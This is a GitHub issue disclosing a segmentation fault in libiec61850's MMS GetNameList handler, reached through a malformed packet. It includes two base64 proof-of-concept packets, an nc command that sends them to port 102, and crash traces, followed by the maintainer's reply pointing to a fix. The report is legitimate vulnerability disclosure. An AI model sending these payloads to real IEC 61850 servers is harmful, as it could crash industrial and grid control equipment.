
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmz-automation%2Flibiec61850%2Fissues%2F492)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmz-automation%2Flibiec61850%2Fissues%2F492)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fissues_fragments%2Fissue_layout&source=header-repo&source_repo=mz-automation%2Flibiec61850)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mz-automation](/mz-automation)
/
**[libiec61850](/mz-automation/libiec61850)**
Public

* [Notifications](/login?return_to=%2Fmz-automation%2Flibiec61850) You must be signed in to change notification settings
* [Fork
  478](/login?return_to=%2Fmz-automation%2Flibiec61850)
* [Star
   910](/login?return_to=%2Fmz-automation%2Flibiec61850)

* [Code](/mz-automation/libiec61850)
* [Issues
  150](/mz-automation/libiec61850/issues)
* [Pull requests
  44](/mz-automation/libiec61850/pulls)
* [Actions](/mz-automation/libiec61850/actions)
* [Projects
  0](/mz-automation/libiec61850/projects)
* [Wiki](/mz-automation/libiec61850/wiki)
* [Security](/mz-automation/libiec61850/security)
* [Insights](/mz-automation/libiec61850/pulse)

Additional navigation options

* [Code](/mz-automation/libiec61850)
* [Issues](/mz-automation/libiec61850/issues)
* [Pull requests](/mz-automation/libiec61850/pulls)
* [Actions](/mz-automation/libiec61850/actions)
* [Projects](/mz-automation/libiec61850/projects)
* [Wiki](/mz-automation/libiec61850/wiki)
* [Security](/mz-automation/libiec61850/security)
* [Insights](/mz-automation/libiec61850/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fmz-automation%2Flibiec61850%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fmz-automation%2Flibiec61850%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# SegmentFault in mmsServer\_handleGetNameListRequest in src/mms/iso\_mms/server/mms\_get\_namelist\_service.c #492

Closed

[Alice-and-Bob](/Alice-and-Bob) opened this issue
Jan 31, 2024
· 3 comments

Closed

# [SegmentFault in mmsServer\_handleGetNameListRequest in src/mms/iso\_mms/server/mms\_get\_namelist\_service.c](#top) #492

[Alice-and-Bob](/Alice-and-Bob) opened this issue
Jan 31, 2024
· 3 comments

## Comments

[![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=80&u=eff01f1cec241d5dec0ecdad23866f55c5d1afb8&v=4)](/Alice-and-Bob)

Copy link

### **[Alice-and-Bob](/Alice-and-Bob)** commented [Jan 31, 2024](#issue-2109915916)

| Description An integer overflow vulnerability was detected in the mMSserver\_handleGetNamelist\_service.c function of src/mms/iso\_mms/server/mms\_get\_namelist\_service.c. The vulnerability manifests as SEGV and causes the application to crash version [v1.4.0](https://github.com/mz-automation/libiec61850/releases/tag/v1.4.0) and earlier release system information ubuntu18.04 proof of conceptpoc `root@VirtualBox:/iec61850-poc/mms_get_namelist_service# base64 poc1 AwAAQQLwgAEAAQBhNDAyAgEAoC2gKwIBGqEmoAOAAQChDYGLVEVNUExBVH////+CEExMTjAkQ0Yk U3RyVmFsMjA=`  `root@VirtualBox:/iec61850-poc/mms_get_namelist_service# base64 poc2 AwAAPgLwgAEAAQBhMTAvAgEAoCqgKAIBbK0jgCEBoR6AHDAaoBihFhoLVEVURQLw gAEAAQBhMTAv AgEAoCqgKAIBbK0jgCEBTEQwAgFs3H/+/qEToAIARU1BVEVMRA==`  [poc\_of\_mms\_get\_namelist\_service.zip](https://github.com/mz-automation/libiec61850/files/14111057/poc_of_mms_get_namelist_service.zip) command ``` cd path/to/libiec61850-v1.4.0/examples/server_example_substitution sudo ./server_example_substitution  cat poc | nc 0.0.0.0 102  ``` result ``` Using libIEC61850 version 1.4.0 Connection opened ASAN:DEADLYSIGNAL ================================================================= ==15239==ERROR: AddressSanitizer: SEGV on unknown address 0x630f80014827 (pc 0x5636eef01b4f bp 0x7efea42fc810 sp 0x7efea42fc570 T3) ==15239==The signal is caused by a READ memory access.     #0 0x5636eef01b4e in mmsServer_handleGetNameListRequest src/mms/iso_mms/server/mms_get_namelist_service.c:446     #1 0x5636eee4acfa in handleConfirmedRequestPdu src/mms/iso_mms/server/mms_server_connection.c:317     #2 0x5636eee4c6b4 in MmsServerConnection_parseMessage src/mms/iso_mms/server/mms_server_connection.c:655     #3 0x5636eee4c838 in messageReceived src/mms/iso_mms/server/mms_server_connection.c:696     #4 0x5636eeea0319 in IsoConnection_handleTcpConnection src/mms/iso_server/iso_connection.c:307     #5 0x5636eeea0faa in handleTcpConnection src/mms/iso_server/iso_connection.c:442     #6 0x5636eee38d99 in destroyAutomaticThread hal/thread/linux/thread_linux.c:90     #7 0x7efea8b0d6da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)     #8 0x7efea849861e in __clone (/lib/x86_64-linux-gnu/libc.so.6+0x12161e)  AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV src/mms/iso_mms/server/mms_get_namelist_service.c:446 in mmsServer_handleGetNameListRequest Thread T3 created by T1 here:     #0 0x7efea8d5cd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)     #1 0x5636eee38e24 in Thread_start hal/thread/linux/thread_linux.c:101     #2 0x5636eeea16bb in IsoConnection_start src/mms/iso_server/iso_connection.c:532     #3 0x5636eee9df3e in handleIsoConnections src/mms/iso_server/iso_server.c:414     #4 0x5636eee9e135 in isoServerThread src/mms/iso_server/iso_server.c:493     #5 0x7efea8b0d6da in start_thread (/lib/x86_64-linux-gnu/libpthread.so.0+0x76da)  Thread T1 created by T0 here:     #0 0x7efea8d5cd2f in __interceptor_pthread_create (/usr/lib/x86_64-linux-gnu/libasan.so.4+0x37d2f)     #1 0x5636eee38ec8 in Thread_start hal/thread/linux/thread_linux.c:105     #2 0x5636eee9e708 in IsoServer_startListening src/mms/iso_server/iso_server.c:611     #3 0x5636eee42149 in MmsServer_startListening src/mms/iso_mms/server/mms_server.c:458     #4 0x5636eee35730 in IedServer_start src/iec61850/server/impl/ied_server.c:612     #5 0x5636eee2036e in main /home/yang/iec61850/libiec61850-1.4.0-asan/examples/server_example_substitution/server_example_substitution.c:188     #6 0x7efea8398c86 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21c86)  ==15239==ABORTING   ``` gdb ``` GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1 Copyright (C) 2018 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html> This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.  Type "show copying" and "show warranty" for details. This GDB was configured as "x86_64-linux-gnu". Type "show configuration" for configuration details. For bug reporting instructions, please see: <http://www.gnu.org/software/gdb/bugs/>. Find the GDB manual and other documentation resources online at: <http://www.gnu.org/software/gdb/documentation/>. For help, type "help". Type "apropos word" to search for commands related to "word"... Reading symbols from ./libiec61850-1.4.0/examples/server_example_substitution/server_example_substitution...done. (gdb) run Starting program: /home/yang/iec61850/libiec61850-1.4.0/examples/server_example_substitution/server_example_substitution  [Thread debugging using libthread_db enabled] Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". Using libIEC61850 version 1.4.0 [New Thread 0x7ffff7424700 (LWP 19188)] [New Thread 0x7ffff6c23700 (LWP 19189)] Connection opened [New Thread 0x7ffff6422700 (LWP 21331)]  Thread 4 "server_example_" received signal SIGSEGV, Segmentation fault. [Switching to Thread 0x7ffff6422700 (LWP 21331)] 0x00005555555b258d in mmsServer_handleGetNameListRequest (connection=0x7ffff0024ae0, buffer=0x7ffff0000c2d "\240+\002\001\032\241&\240\003\200\001", bufPos=-2147483621, maxBufPos=45, invokeId=26,      response=0x7ffff6421e00) at src/mms/iso_mms/server/mms_get_namelist_service.c:446 warning: Source file is more recent than executable. 446	        uint8_t tag = buffer[bufPos++]; (gdb) print bufPos $1 = -2147483621 (gdb)    ``` |
| --- |
| The text was updated successfully, but these errors were encountered: |

All reactions

[![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=80&u=eff01f1cec241d5dec0ecdad23866f55c5d1afb8&v=4)](/Alice-and-Bob)

Copy link

Author

### **[Alice-and-Bob](/Alice-and-Bob)** commented [Jan 31, 2024](#issuecomment-1918953702)

| hi，[@mzillgith](https://github.com/mzillgith) and teams. If you handle the error as soon as possible, I will provide all possible information |
| --- |

All reactions

Sorry, something went wrong.

[![@mzillgith](https://avatars.githubusercontent.com/u/25686324?s=80&v=4)](/mzillgith)

Copy link

Contributor

### **[mzillgith](/mzillgith)** commented [Feb 15, 2024](#issuecomment-1947352301)

| Hi, Thank you. However you are using a very old version of the library. Seems the problem is already fixed in the current versions of the library. But applying your poc2 seems to trigger another issue that should be fixed with commit [cf94d64](https://github.com/mz-automation/libiec61850/commit/cf94d64206cf53298edf4799a75b31657bb7cbb3) |
| --- |

All reactions

Sorry, something went wrong.

[![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=80&u=eff01f1cec241d5dec0ecdad23866f55c5d1afb8&v=4)](/Alice-and-Bob)

Copy link

Author

### **[Alice-and-Bob](/Alice-and-Bob)** commented [Feb 16, 2024](#issuecomment-1948259056)

| Hi, Thank you. However you are using a very old version of the library. Seems the problem is already fixed in the current versions of the library. But applying your poc2 seems to trigger another issue that should be fixed with commit [cf94d64](https://github.com/mz-automation/libiec61850/commit/cf94d64206cf53298edf4799a75b31657bb7cbb3)  Yes, I found the bug fixed by the [cf94d64](https://github.com/mz-automation/libiec61850/commit/cf94d64206cf53298edf4799a75b31657bb7cbb3) branch using poc2 before your. It is possible that I am mistaken about the poc and the vulnerability it corresponds to. However, this poc can cause SEGV errors in all versions before the fix is committed. I will address this in more detail in a separate issue. |
| --- |

All reactions

Sorry, something went wrong.

[![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=40&u=eff01f1cec241d5dec0ecdad23866f55c5d1afb8&v=4)](/Alice-and-Bob)
[Alice-and-Bob](/Alice-and-Bob)
closed this as [completed](/mz-automation/libiec61850/issues?q=is%3Aissue+is%3Aclosed+archived%3Afalse+reason%3Acompleted)
[Feb 16, 2024](#event-11828001950)

[![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=40&u=eff01f1cec241d5dec0ecdad23866f55c5d1afb8&v=4)](/Alice-and-Bob)
[Alice-and-Bob](/Alice-and-Bob)
mentioned this issue
[Feb 16, 2024](#ref-issue-2138545511)

[SegmentFault in mmsServer\_handleDeleteNamedVariableListRequest in src/mms/iso\_mms/server/mms\_named\_variable\_list\_service.c:146
#495](/mz-automation/libiec61850/issues/495)

Closed

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fmz-automation%2Flibiec61850%2Fissues%2F492)

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

No branches or pull requests

2 participants

[![@mzillgith](https://avatars.githubusercontent.com/u/25686324?s=52&v=4)](/mzillgith) [![@Alice-and-Bob](https://avatars.githubusercontent.com/u/35800829?s=52&v=4)](/Alice-and-Bob)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

